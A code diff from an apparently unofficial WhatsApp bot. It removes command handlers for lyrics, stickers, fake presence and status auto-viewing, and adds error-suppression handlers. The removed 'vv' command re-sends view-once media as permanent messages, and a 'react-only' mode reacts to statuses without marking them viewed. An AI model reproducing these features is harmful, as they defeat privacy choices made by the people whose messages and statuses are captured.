-    // ── Format & send lyrics ──────────────────────────────────────────
-    const _cleanLyrics = _lyrResult.lyrics
-        .replace(/\r\n/g, '\n')
-        .replace(/\n{3,}/g, '\n\n')
-        .trim()
-
-    // Split into chunks if lyrics are too long (WA message limit ~65KB)
-    const _MAX_CHUNK = 3500
-    const _lyrHeader =
-`╔══════════════════════════╗
-║  🎵 *SONG LYRICS*
-╚══════════════════════════╝
-
-  ├ 🎤 *Title*  › ${_lyrResult.title}
-  ├ 👤 *Artist* › ${_lyrResult.artist}${_lyrResult.album ? `\n  ├ 💿 *Album*  › ${_lyrResult.album}` : ''}
-  └ 📡 *Source* › ${_lyrSource}
-
-┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
-
-`
-
-    if (_cleanLyrics.length <= _MAX_CHUNK) {
-        const _fullMsg = _lyrHeader + _cleanLyrics + '\n\n_─────────────────────────_\n_🤖 TOOSII-XD ULTRA_'
-        // Send with thumbnail if available
-        if (_lyrResult.thumbnail) {
-            try {
-                const _thumb = await getBuffer(_lyrResult.thumbnail)
-                await X.sendMessage(m.chat, { image: _thumb, caption: _fullMsg }, { quoted: m })
-            } catch {
-                reply(_fullMsg)
-            }
-        } else {
-            reply(_fullMsg)
-        }
-    } else {
-        // Send in multiple parts for long lyrics
-        const _parts = []
-        let _remaining = _cleanLyrics
-        while (_remaining.length > 0) {
-            // Try to break at a newline near the limit
-            let _cutAt = _MAX_CHUNK
-            if (_remaining.length > _MAX_CHUNK) {
-                const _breakAt = _remaining.lastIndexOf('\n', _MAX_CHUNK)
-                _cutAt = _breakAt > 500 ? _breakAt : _MAX_CHUNK
-            }
-            _parts.push(_remaining.slice(0, _cutAt).trim())
-            _remaining = _remaining.slice(_cutAt).trim()
-        }
-
-        // Part 1 — with header and thumbnail
-        const _part1 = _lyrHeader + _parts[0]
-        if (_lyrResult.thumbnail) {
-            try {
-                const _thumb = await getBuffer(_lyrResult.thumbnail)
-                await X.sendMessage(m.chat, { image: _thumb, caption: _part1 }, { quoted: m })
-            } catch {
-                await X.sendMessage(m.chat, { text: _part1 }, { quoted: m })
-            }
-        } else {
-            await X.sendMessage(m.chat, { text: _part1 }, { quoted: m })
-        }
-
-        // Remaining parts
-        for (let _pi = 1; _pi < _parts.length; _pi++) {
-            const _isLast = _pi === _parts.length - 1
-            await X.sendMessage(m.chat, {
-                text: `🎵 *[Part ${_pi + 1}/${_parts.length}]*\n\n${_parts[_pi]}${_isLast ? '\n\n_─────────────────────────_\n_🤖 TOOSII-XD ULTRA_' : ''}`
-            }, { quoted: m })
-            await new Promise(r => setTimeout(r, 500))
-        }
-    }
-} break
-case 'owner':
-case 'creator': {
-    await X.sendMessage(m.chat, { react: { text: '👑', key: m.key } })
-    await reply(`╔══════════════════════════╗
-║  👑 *BOT CREATOR*
-╚══════════════════════════╝
-
-  ├ 🧑‍💻 *Name*     › ${global.ownername || 'Toosii Tech'}
-  ├ 📞 *WhatsApp* › +${(global.ownerNumber || '254748340864').replace(/[^0-9]/g,'')}
-  ├ ✈️  *Telegram* › @toosiitech
-  ├ 🤖 *Bot*      › ${global.botname} v${global.botver}
-  └ 🔑 *Session*  › ${global.sessionUrl}
-
-_👇 Tap the contact card below to chat with owner_`)
-    const namaown = global.ownername || 'Toosii Tech'
-    const ownerNum = (global.ownerNumber || '254748340864').replace(/[^0-9]/g, '')
-    const contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-        contactMessage: {
-            displayName: namaown,
-            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${ownerNum}:+${ownerNum}\nitem1.X-ABLabel:WhatsApp\nX-WA-BIZ-NAME:${namaown}\nEND:VCARD`
-        }
-    }), { userJid: m.chat, quoted: m })
-    X.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
-}
-break
-
-case 'sc': {
-    await X.sendMessage(m.chat, { react: { text: '📜', key: m.key } })
-reply(`╔══════════════════════════╗\n║  🤖 *${global.botname}*\n╚══════════════════════════╝\n\n  ├ 📞 *WhatsApp* › wa.me/254748340864\n  ├ ✈️  *Telegram* › t.me/toosiitech\n  └ 🔑 *Session*  › ${global.sessionUrl}\n\n_⚡ Powered by ${global.ownername || 'Toosii Tech'}_`)
-}
-break
-
-case 'infobot':
-case 'botinfo': {
-    await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
-  const botInfo = `╔══════════════════════════╗
-║  🤖 *BOT INFO*
-╚══════════════════════════╝
-
-  ├ 📛 *Name*     › ${botname}
-  ├ 👑 *Owner*    › ${ownername}
-  ├ 🏷️  *Version*  › v${botver}
-  ├ 📋 *Commands* › ${totalfitur()}
-  ├ ⏱️  *Uptime*   › ${runtime(process.uptime())}
-  ├ 🔒 *Mode*     › ${X.public ? 'Public' : 'Private'}
-  ├ 🔤 *Prefix*   › ${global.botPrefix || 'Multi-prefix'}
-
-  ├ 📞 *Contact*  › ${global.ownerNumber}
-  ├ ✈️  *Telegram* › @toosiitech
-  └ 🔑 *Session*  › ${global.sessionUrl}
-
-_⚡ Powered by ${global.ownername || 'Toosii Tech'}_\``
-  reply(botInfo)
-}
-break
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Sticker Features
-case 'bratvid':
-case 'bratv':
-case 'bratvideo': {
-    await X.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
-  if (!text) return reply(`Example: ${prefix + command} hai bang`)
-  if (text.length > 250) return reply(`Character limit exceeded, max 250!`)
-  const words = text.split(" ")
-  const tempDir = path.join(process.cwd(), 'tmp')
-  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
-  const framePaths = []
-
-  try {
-    for (let i = 0; i < words.length; i++) {
-      const currentText = words.slice(0, i + 1).join(" ")
-
-      const res = await axios.get(
-        `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(currentText)}`,
-        { responseType: "arraybuffer" }
-      ).catch((e) => e.response)
-
-      const framePath = path.join(tempDir, `frame${i}.mp4`)
-      fs.writeFileSync(framePath, res.data)
-      framePaths.push(framePath)
-    }
-
-    const fileListPath = path.join(tempDir, "filelist.txt")
-    let fileListContent = ""
-
-    for (let i = 0; i < framePaths.length; i++) {
-      fileListContent += `file '${framePaths[i]}'\n`
-      fileListContent += `duration 0.7\n`
-    }
-
-    fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
-    fileListContent += `duration 2\n`
-
-    fs.writeFileSync(fileListPath, fileListContent)
-    const outputVideoPath = path.join(tempDir, "output.mp4")
-    execSync(
-      `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`
+process.on('uncaughtException', (err) => {
+    let em = (err?.message || String(err)).toLowerCase()
+    let es = (err?.stack || '').toLowerCase()
+    let isSignal = (
+        em.includes('no sessions') || em.includes('sessionerror') ||
+        em.includes('bad mac') || em.includes('failed to decrypt') ||
+        em.includes('no senderkey') || em.includes('invalid prekey') ||
+        em.includes('invalid message') || em.includes('nosuchsession') ||
+        es.includes('session_cipher') || es.includes('libsignal') || es.includes('queue_job')
     )
-
-    await X.sendImageAsStickerAV(m.chat, outputVideoPath, m, {
-      packname: '',
-      author: `${global.author}`
-    })
-
-    framePaths.forEach((frame) => {
-      if (fs.existsSync(frame)) fs.unlinkSync(frame)
-    })
-    if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
-    if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
-  } catch (err) {
-    console.error(err)
-    reply('An error occurred')
-  }
-}
-break
-
-case 'brat': {
-    await X.sendMessage(m.chat, { react: { text: '✏️', key: m.key } })
-if (!q) return reply(`Please enter text\n\nExample: ${prefix + command} alok hamil`);
-let rulz = `https://aqul-brat.hf.space/api/brat?text=${encodeURIComponent(q)}`;
-try {
-const res = await axios.get(rulz, { responseType: 'arraybuffer' });
-const buffer = Buffer.from(res.data, 'binary');
-await X.sendImageAsStickerAV(m.chat, buffer, m, { packname: ``, author: `${global.author}` });
-} catch (e) {
-console.log(e);
-await reply(`API is currently down or under maintenance. Please try again later.`);
-    }
-}
-break
-
-case 'emojimix': {
-    await X.sendMessage(m.chat, { react: { text: '😎', key: m.key } })
-    if (!text) return reply(`Enter two emojis to mix\n\nExample: ${prefix + command} [emoji1]+[emoji2]`);
-
-    const emojis = text.split(/[\+\|]/);
-    if (emojis.length !== 2) return reply('Please enter two valid emojis, example: +  or |');
-    const text1 = emojis[0].trim();
-    const text2 = emojis[1].trim();
- 
-    let api = `https://fastrestapis.fasturl.cloud/maker/emojimix?emoji1=${text1}&emoji2=${text2}`;
-    await X.sendImageAsStickerAV(m.chat, api, m, { packname: '', author: `${packname}` });
-}
-break;
-case 'qc': {
-    await X.sendMessage(m.chat, { react: { text: '💬', key: m.key } })
-    let text;
-
-    if (args.length >= 1) {
-        text = args.slice(0).join(" ");
-    } else if (m.quoted && m.quoted.text) {
-        text = m.quoted.text;
+    if (isSignal) {
+        console.log('[Suppressed-UncaughtException] Signal noise:', err.message || err)
     } else {
-        return reply("Enter text or reply to a message to make a quote!");
+        console.error('[UncaughtException]', err.message || err)
     }
-    if (!text) return reply('Please enter text');
-    if (text.length > 200) return reply('Maximum 200 characters!');
-    let ppnyauser = await X.profilePictureUrl(m.sender, 'image').catch(_ => 'https://files.catbox.moe/nwvkbt.png');
-    const rest = await quote(text, pushname, ppnyauser);
-    X.sendImageAsStickerAV(m.chat, rest.result, m, {
-        packname: ``,
-        author: `${global.author}`
-    });
-}
-break
-case 'sticker':
-case 'stiker':
-case 's':{
-    await X.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
-if (!quoted) return reply(`Reply to Video/Image with caption ${prefix + command}`)
-if (/image/.test(mime)) {
-let media = await quoted.download()
-let encmedia = await X.sendImageAsStickerAV(m.chat, media, m, {
-packname: global.packname,
-author: global.author
 })
-} else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 31) return reply('Maximum 30 seconds!')
-let media = await quoted.download()
-let encmedia = await X.sendVideoAsStickerAV(m.chat, media, m, {
-packname: global.packname,
-author: global.author
+process.on('unhandledRejection', (err) => {
+    let em = (err?.message || String(err)).toLowerCase()
+    let es = (err?.stack || '').toLowerCase()
+    let isSignal = (
+        em.includes('no sessions') || em.includes('sessionerror') ||
+        em.includes('bad mac') || em.includes('failed to decrypt') ||
+        em.includes('no senderkey') || em.includes('invalid prekey') ||
+        em.includes('invalid message') || em.includes('nosuchsession') ||
+        es.includes('session_cipher') || es.includes('libsignal') || es.includes('queue_job')
+    )
+    if (isSignal) {
+        console.log('[Suppressed-UnhandledRejection] Signal noise:', err?.message || err)
+    } else {
+        console.error('[UnhandledRejection]', err?.message || err)
+    }
 })
-} else {
-return reply(`Send an Image/Video with caption ${prefix + command}\nVideo duration: 1-9 seconds`)
-}
-}
-break
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Take / Steal Sticker
-case 'take':
-case 'steal': {
-    await X.sendMessage(m.chat, { react: { text: '🎨', key: m.key } })
-    if (!quoted) return reply(`Reply to a *sticker* with *${prefix + command}* to re-send it with your pack info.\n\nUsage: *${prefix + command} [packname|author]*\nExample: *${prefix}take MyPack|MyName*`)
-    if (mime !== 'image/webp') return reply(`Reply to a *sticker* to use *${prefix + command}*`)
-
-    let _tkPack = global.packname || 'XD Ultra'
-    let _tkAuth = global.author || 'Bot'
-
-    if (text) {
-        const _split = text.split('|')
-        if (_split.length >= 2) {
-            _tkPack = _split[0].trim()
-            _tkAuth = _split[1].trim()
-        } else {
-            _tkPack = text.trim()
-        }
-    }
-
-    try {
-        const _tkMedia = await quoted.download()
-
-        // Detect animated WebP by ANIM chunk presence (bytes 12-16)
-        const _isAnimated = _tkMedia && _tkMedia.length > 16 && _tkMedia.toString('ascii', 12, 16) === 'ANIM'
-
-        if (_isAnimated) {
-            // Animated sticker — route through video pipeline
-            await X.sendVideoAsStickerAV(m.chat, _tkMedia, m, {
-                packname: _tkPack,
-                author: _tkAuth
-            })
-        } else {
-            // Static WebP sticker — inject EXIF metadata directly, skip ffmpeg entirely
-            const _webp    = require('node-webpmux')
-            const _Crypto  = require('crypto')
-            const _os      = require('os')
-            const _fs      = require('fs')
-            const _path    = require('path')
-
-            const _tmpIn  = _path.join(_os.tmpdir(), `tk_${_Crypto.randomBytes(4).toString('hex')}.webp`)
-            const _tmpOut = _path.join(_os.tmpdir(), `tk_${_Crypto.randomBytes(4).toString('hex')}.webp`)
-            _fs.writeFileSync(_tmpIn, _tkMedia)
-
-            const _img = new _webp.Image()
-            const _json = {
-                'sticker-pack-id': 'TOOSII-XD-ULTRA',
-                'sticker-pack-name': _tkPack,
-                'sticker-pack-publisher': _tkAuth,
-                'emojis': ['']
-            }
-            const _exifAttr = Buffer.from([0x49,0x49,0x2A,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x41,0x57,0x07,0x00,0x00,0x00,0x00,0x00,0x16,0x00,0x00,0x00])
-            const _jsonBuf  = Buffer.from(JSON.stringify(_json), 'utf-8')
-            const _exif     = Buffer.concat([_exifAttr, _jsonBuf])
-            _exif.writeUIntLE(_jsonBuf.length, 14, 4)
-            await _img.load(_tmpIn)
-            _img.exif = _exif
-            await _img.save(_tmpOut)
-
-            const _finalBuf = _fs.readFileSync(_tmpOut)
-            try { _fs.unlinkSync(_tmpIn) } catch {}
-            try { _fs.unlinkSync(_tmpOut) } catch {}
-
-            await X.sendMessage(m.chat, { sticker: _finalBuf }, { quoted: m })
-        }
-    } catch (e) {
-        console.error('Take sticker error:', e.message)
-        reply('❌ Failed to steal sticker: ' + (e.message || 'Unknown error'))
-    }
-}
-break
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// View Once Opener
-case 'vv': {
-    await X.sendMessage(m.chat, { react: { text: '👁️', key: m.key } })
-if (!m.quoted) return reply(`Reply to a *view once* image or video with *${prefix}vv* to open it`)
-let quotedMsg = m.quoted
-let quotedType = quotedMsg.mtype || ''
-let viewOnceContent = null
-if (quotedType === 'viewOnceMessage' || quotedType === 'viewOnceMessageV2' || quotedType === 'viewOnceMessageV2Extension') {
-    let innerMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage
-    if (innerMsg) {
-        let voKey = innerMsg.viewOnceMessage || innerMsg.viewOnceMessageV2 || innerMsg.viewOnceMessageV2Extension
-        if (voKey && voKey.message) {
-            let innerType = Object.keys(voKey.message)[0]
-            viewOnceContent = { type: innerType, msg: voKey.message[innerType] }
-        }
-    }
-}
-if (!viewOnceContent) {
-    let rawQuoted = m.msg?.contextInfo?.quotedMessage
-    if (rawQuoted) {
-        for (let vk of ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension']) {
-            if (rawQuoted[vk] && rawQuoted[vk].message) {
-                let innerType = Object.keys(rawQuoted[vk].message)[0]
-                viewOnceContent = { type: innerType, msg: rawQuoted[vk].message[innerType] }
-                break
-            }
-        }
-    }
-}
-if (!viewOnceContent) {
-    if (/image/.test(mime)) {
-        viewOnceContent = { type: 'imageMessage', msg: quotedMsg.msg || quotedMsg }
-    } else if (/video/.test(mime)) {
-        viewOnceContent = { type: 'videoMessage', msg: quotedMsg.msg || quotedMsg }
-    }
-}
-if (!viewOnceContent) return reply('This message is not a view once message. Reply to a view once image or video.')
-try {
-    let stream = await downloadContentFromMessage(viewOnceContent.msg, viewOnceContent.type.replace('Message', ''))
-    let buffer = Buffer.from([])
-    for await (let chunk of stream) {
-        buffer = Buffer.concat([buffer, chunk])
-    }
-    if (viewOnceContent.type === 'imageMessage') {
-        await X.sendMessage(from, { image: buffer, caption: viewOnceContent.msg.caption || '' }, { quoted: m })
-    } else if (viewOnceContent.type === 'videoMessage') {
-        await X.sendMessage(from, { video: buffer, caption: viewOnceContent.msg.caption || '' }, { quoted: m })
-    } else if (viewOnceContent.type === 'audioMessage') {
-        await X.sendMessage(from, { audio: buffer, mimetype: 'audio/mp4' }, { quoted: m })
-    } else {
-        reply('Unsupported view once media type.')
-    }
-} catch (err) {
-    console.error('VV Error:', err)
-    reply('Failed to open view once message: ' + (err.message || 'Unknown error'))
-}
-}
-break
-
-case 'autorecording':
-case 'autorecord':
-case 'fakerecording':
-case 'fakerecord':
-case 'frecord': {
-    await X.sendMessage(m.chat, { react: { text: '🎙️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-if (global.fakePresence === 'recording') {
-    global.fakePresence = 'off'
-    reply('❌ *Auto Recording OFF*')
-} else {
-    global.fakePresence = 'recording'
-    reply('✅ *Auto Recording ON* — bot appears as recording audio.')
-}
-}
-break
-
-case 'autotyping':
-case 'faketyping':
-case 'faketype':
-case 'ftype': {
-    await X.sendMessage(m.chat, { react: { text: '⌨️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-if (global.fakePresence === 'typing') {
-    global.fakePresence = 'off'
-    reply('❌ *Auto Typing OFF*')
-} else {
-    global.fakePresence = 'typing'
-    reply('✅ *Auto Typing ON* — bot appears as typing.')
-}
-}
-break
-
-case 'autoonline':
-case 'fakeonline':
-case 'fonline': {
-    await X.sendMessage(m.chat, { react: { text: '🟢', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-if (global.fakePresence === 'online') {
-    global.fakePresence = 'off'
-    reply('❌ *Auto Online OFF*')
-} else {
-    global.fakePresence = 'online'
-    reply('✅ *Auto Online ON* — bot appears as online.')
-}
-}
-break
-
-case 'fakestatus':
-case 'fpresence': {
-    await X.sendMessage(m.chat, { react: { text: '👻', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let current = global.fakePresence || 'off'
-reply(`╔══════════════════════════╗\n║  👻 *PRESENCE STATUS*\n╚══════════════════════════╝\n\n  ├ 📊 *Mode* › *${current}*\n\n  ├ ${prefix}autotyping    — toggle typing\n  ├ ${prefix}autorecording — toggle recording\n  └ ${prefix}autoonline    — toggle online\n\n  _Run again to turn off_`)
-}
-break
-
-case 'autoviewstatus':
-case 'autoview':
-case 'avs': {
-    await X.sendMessage(m.chat, { react: { text: '👁️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let avsArg = (args[0] || '').toLowerCase()
-if (avsArg === 'on' || avsArg === 'enable') {
-    global.autoViewStatus = true
-    reply('*👀 Auto View Status: ✅ ON*\n\nBot will automatically view all contact statuses.\n_Protocol: readMessages + sendReceipt (Meta 2024+)_')
-} else if (avsArg === 'off' || avsArg === 'disable') {
-    global.autoViewStatus = false
-    reply('*👀 Auto View Status: ❌ OFF*\n\nBot will no longer auto-view statuses.')
-} else {
-    if (global.autoViewStatus) {
-        global.autoViewStatus = false
-        reply('*👀 Auto View Status: ❌ OFF*\n\nBot will no longer auto-view statuses.')
-    } else {
-        global.autoViewStatus = true
-        reply('*👀 Auto View Status: ✅ ON*\n\nBot will automatically view all contact statuses.\n_Protocol: readMessages + sendReceipt (Meta 2024+)_')
-    }
-}
-}
-break
-
-case 'autolikestatus':
-case 'autolike':
-case 'als':
-case 'sr':
-case 'reactstatus':
-case 'statusreact': {
-    await X.sendMessage(m.chat, { react: { text: '❤️', key: m.key } })
-    if (!isOwner) return reply(mess.OnlyOwner)
-
-    // Init global react manager state
-    if (!global.arManager) global.arManager = {
-        enabled: false,
-        viewMode: 'view+react',   // 'view+react' | 'react-only'
-        mode: 'fixed',            // 'fixed' | 'random'
-        fixedEmoji: '❤️',
-        reactions: ['❤️','🔥','👍','😂','😮','👏','🎉','🎯','💯','🌟','✨','⚡','💥','🫶','🐺'],
-        totalReacted: 0,
-        reactedIds: [],           // dedupe by status id
-        lastReactionTime: 0,
-        rateLimitDelay: 2000,
-    }
-    const _ar = global.arManager
-    const _arAction = (args[0] || '').toLowerCase().trim()
-    const _arVal = (args[1] || '').trim()
-
-    // Helper: status line
-    const _arStatus = () => {
-        const _vm = _ar.viewMode === 'view+react' ? '👁️ + react' : 'react only'
-        const _em = _ar.mode === 'fixed' ? _ar.fixedEmoji : '🎲 random'
-        return `╔══════════════════════════╗\n║  ❤️  *AUTO REACT STATUS*\n╚══════════════════════════╝\n\n  ├ 📊 *Status*    › ${_ar.enabled ? '✅ ON' : '❌ OFF'}\n  ├ 👁️  *View Mode* › ${_vm}\n  ├ 🎭 *Emoji*     › ${_em}\n  ├ 📈 *Reacted*   › ${_ar.totalReacted} statuses\n  └ 🎨 *Pool*      › ${_ar.reactions.join(' ')}\n\n  *Commands:*\n  ├ ${prefix}als on / off\n  ├ ${prefix}als view+react / react-only\n  ├ ${prefix}als fixed / random\n  ├ ${prefix}als emoji [emoji]\n  ├ ${prefix}als add [emoji] / remove [emoji]\n  ├ ${prefix}als reset\n  └ ${prefix}als stats`
-    }
-
-    if (!_arAction || _arAction === 'status') return reply(_arStatus())
-
-    if (_arAction === 'on' || _arAction === 'enable') {
-        _ar.enabled = true
-        global.autoLikeStatus = true
-        global.autoViewStatus = _ar.viewMode === 'view+react'
-        return reply(`✅ *Auto React ON*\n└ Mode: ${_ar.viewMode} · ${_ar.mode === 'fixed' ? _ar.fixedEmoji : 'random'}`)
-    }
-
-    if (_arAction === 'off' || _arAction === 'disable') {
-        _ar.enabled = false
-        global.autoLikeStatus = false
-        return reply(`❌ *Auto React OFF*`)
-    }
-
-    if (_arAction === 'view+react' || _arAction === 'viewreact') {
-        _ar.viewMode = 'view+react'
-        global.autoViewStatus = true
-        return reply(`👁️ *View + React mode* — bot marks status as viewed then reacts.`)
-    }
-
-    if (_arAction === 'react-only' || _arAction === 'reactonly') {
-        _ar.viewMode = 'react-only'
-        return reply(`🎭 *React-only mode* — reacts without marking as viewed.`)
-    }
-
-    if (_arAction === 'fixed') {
-        _ar.mode = 'fixed'
-        return reply(`📌 *Fixed mode* — always reacts with ${_ar.fixedEmoji}`)
-    }
-
-    if (_arAction === 'random') {
-        _ar.mode = 'random'
-        return reply(`🎲 *Random mode* — picks random emoji from pool:\n${_ar.reactions.join(' ')}`)
-    }
-
-    if (_arAction === 'emoji') {
-        if (!_arVal) return reply(`❌ Usage: *${prefix}als emoji ❤️*`)
-        _ar.fixedEmoji = _arVal
-        _ar.mode = 'fixed'
-        global.autoLikeEmoji = _arVal
-        return reply(`✅ Emoji set to *${_arVal}* (fixed mode)`)
-    }
-
-    if (_arAction === 'add') {
-        if (!_arVal) return reply(`❌ Usage: *${prefix}als add 🔥*`)
-        if (_ar.reactions.includes(_arVal)) return reply(`⚠️ *${_arVal}* already in pool.`)
-        _ar.reactions.push(_arVal)
-        return reply(`✅ *${_arVal}* added.\n\n${_ar.reactions.join(' ')}`)
-    }
-
-    if (_arAction === 'remove') {
-        if (!_arVal) return reply(`❌ Usage: *${prefix}als remove 🔥*`)
-        const _ri = _ar.reactions.indexOf(_arVal)
-        if (_ri === -1) return reply(`❌ *${_arVal}* not in pool.`)
-        _ar.reactions.splice(_ri, 1)
-        return reply(`✅ *${_arVal}* removed.\n\n${_ar.reactions.join(' ')}`)
-    }
-
-    if (_arAction === 'reset') {
-        _ar.reactions = ['❤️','🔥','👍','😂','😮','👏','🎉','🎯','💯','🌟','✨','⚡','💥','🫶','🐺']
-        _ar.totalReacted = 0
-        _ar.reactedIds = []
-        return reply(`🔄 *Reset* — emoji pool restored, stats cleared.`)
-    }
-
-    if (_arAction === 'stats') {
-        return reply(`╔══════════════════════════╗\n║  📊 *REACT STATS*\n╚══════════════════════════╝\n\n  ├ 📈 *Total reacted* › ${_ar.totalReacted}\n  ├ 🗂️  *Tracked IDs*   › ${_ar.reactedIds.length}\n  ├ 🎭 *Mode*          › ${_ar.mode}\n  ├ 👁️  *View Mode*     › ${_ar.viewMode}\n  └ 🎨 *Emoji pool*    › ${_ar.reactions.join(' ')}`)
-    }
-
-    if (_arAction === 'list' || _arAction === 'emojis') {
-        return reply(`🎨 *Emoji Pool (${_ar.reactions.length}):*\n\n${_ar.reactions.join(' ')}\n\n├ Fixed: ${_ar.fixedEmoji}\n└ Mode: ${_ar.mode}`)
-    }
-
-    reply(_arStatus())
-}
-break
-
-case 'statusconfig':
-case 'autostatus': {
-    await X.sendMessage(m.chat, { react: { text: '⚙️', key: m.key } })
-if (!isOwner) return reply(mess.OnlyOwner)
-let viewState = global.autoViewStatus ? '✅ ON' : '❌ OFF'
-let likeState = (global.autoLikeStatus && global.autoLikeEmoji) ? `✅ ON (${global.autoLikeEmoji})` : '❌ OFF'
-let replyState = global.autoReplyStatus ? `✅ ON ("${global.autoReplyStatusMsg}")` : '❌ OFF'
-let fwdState = global.statusToGroup ? '✅ ON' : '❌ OFF'
-let fwdGroup = global.statusToGroup ? global.statusToGroup : 'Not set'
-let asmState = global.antiStatusMention ? `✅ ON (${(global.antiStatusMentionAction||'warn').toUpperCase()})` : '❌ OFF'
-reply(`╔══════════════════════════╗
-║  📊 *STATUS TOOLS CONFIG*
-╚══════════════════════════╝
-
-  ├ 👀 *Auto View*    › ${viewState}
-  ├ ❤️  *Auto Like*    › ${likeState}
-  ├ 💬 *Auto Reply*   › ${replyState}
-  ├ 📤 *Forward*      › ${fwdState}
-  └ 🛡️  *Anti-Mention* › ${asmState}
-
-┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
-  ⚙️  *Commands*
-  ├ ${prefix}autoviewstatus
-  ├ ${prefix}autolikestatus [emoji/off]
-  ├ ${prefix}autoreplystatus [msg/off]
-  ├ ${prefix}togroupstatus on/off
-  └ ${prefix}antistatusmention [on/warn/kick/del]`)
-}
-break
-
-case 'togroupstatus':
-case 'statustogroup':
-case 'fwdstatus': {
-    await X.sendMessage(m.chat, { react: { text: '📢', key: m.key } })
-// ── Two modes ─────────────────────────────────────────────────────────────────
-// 1. Used inside a group with media/text → posts it as a status visible to group members
-// 2. Used with 'on'/'off' arg → enables/disables AUTO-FORWARD of incoming statuses to this group
-if (!isOwner) return reply(mess.OnlyOwner)
-
-let _tgsArg = (args[0] || '').toLowerCase()
-
-// Mode 2: toggle auto-forward
-if (_tgsArg === 'on' || _tgsArg === 'enable') {
-    if (!m.isGroup) return reply(`❌ Use *${prefix}togroupstatus on* inside the group you want statuses forwarded to.`)
-    global.statusToGroup = from
-    reply(`✅ *Status Auto-Forward: ON*
-
-All incoming statuses will be forwarded to:
-*${groupName || from}*
-
-Use *${prefix}togroupstatus off* to disable.`)
-} else if (_tgsArg === 'off' || _tgsArg === 'disable') {
-    global.statusToGroup = ''
-    reply('❌ *Status Auto-Forward: OFF*\n\nStatuses will no longer be forwarded to any group.')
-} else if (_tgsArg === 'status') {
-    let fwdGroup = global.statusToGroup
-    if (fwdGroup) {
-        let fwdMeta = await X.groupMetadata(fwdGroup).catch(() => null)
-        reply(`📊 *Status Auto-Forward: ✅ ON*
-
-Forwarding to: *${fwdMeta?.subject || fwdGroup}*
-
-Use *${prefix}togroupstatus off* to disable.`)
-    } else {
-        reply(`📊 *Status Auto-Forward: ❌ OFF*
-
-Use *${prefix}togroupstatus on* inside a group to enable.`)
-    }
-} else {
-    // Mode 1: post quoted media/text as status visible to group members
-    if (!m.isGroup) return reply(`╔══════════════════════════╗\n║  📤 *STATUS TOOLS*\n╚══════════════════════════╝\n\n  *Post to group status:*\n  ├ Reply to media/text with *${prefix}togroupstatus*\n  └ Or: *${prefix}togroupstatus [text]*\n\n  *Auto-forward:*\n  ├ *${prefix}togroupstatus on*  — enable in group\n  ├ *${prefix}togroupstatus off* — disable\n  └ *${prefix}togroupstatus status* — check setting`)
-    try {
-        let groupParticipants = participants.map(p => p.id)
-        if (!groupParticipants.length) return reply('Could not fetch group participants. Try again.')
-
-        if (m.quoted) {
-            let qType = m.quoted.mtype || ''
-            let qMime = m.quoted.mimetype || m.quoted.msg?.mimetype || ''
-            if (qType === 'imageMessage' || /image/.test(qMime)) {
-                let buf = await m.quoted.download()
-                let cap = m.quoted.text || m.quoted.caption || ''
-                await X.sendMessage('status@broadcast', { image: buf, caption: cap, backgroundColor: '#000000', font: 0 }, { statusJidList: groupParticipants })
-                reply('✅ *Image posted to group status!*')
-            } else if (qType === 'videoMessage' || /video/.test(qMime)) {
-                let buf = await m.quoted.download()
-                let cap = m.quoted.text || m.quoted.caption || ''
-                await X.sendMessage('status@broadcast', { video: buf, caption: cap, gifPlayback: false }, { statusJidList: groupParticipants })
-                reply('✅ *Video posted to group status!*')
-            } else if (m.quoted.text) {
-                await X.sendMessage('status@broadcast', { text: m.quoted.text, backgroundColor: '#075E54', font: 4 }, { statusJidList: groupParticipants })
-                reply('✅ *Text posted to group status!*')
-            } else {
-                reply(`❌ Unsupported type. Reply to an image, video, or text message.`)
-            }
-        } else if (text) {
-            await X.sendMessage('status@broadcast', { text: text, backgroundColor: '#075E54', font: 4 }, { statusJidList: groupParticipants })
-            reply(`✅ *Text posted to group status!*`)
-        } else {
-reply(`╔══════════════════════════╗\n║  📤 *GROUP STATUS POSTER*\n╚══════════════════════════╝\n\n  ├ Reply to media with *${prefix}togroupstatus*\n  ├ Or: *${prefix}togroupstatus [text]*\n  └ Auto-forward: *${prefix}togroupstatus on*`)
-        }
-    } catch(e) {
-        reply(`❌ Failed to post group status: ${e.message}`)
-    }
-}
-}
-break
 
 //━━━━━━━━━━━━━━━━━━━━━━━━//
-// Developer tools
-case 'self':
-case 'private': {
-    await X.sendMessage(m.chat, { react: { text: '🔒', key: m.key } })
-if (!isDeployedNumber) return reply(mess.OnlyOwner)
-X.public = false
-reply(`*🔒 Bot Mode: PRIVATE*\n\nOnly the deployed number (*${botClean}*) can use commands.\n\n❌ All other users are now blocked from using any command.`)
-}
-break
-
-case 'public': {
-    await X.sendMessage(m.chat, { react: { text: '🔓', key: m.key } })
-if (!isDeployedNumber) return reply(mess.OnlyOwner)
-X.public = true
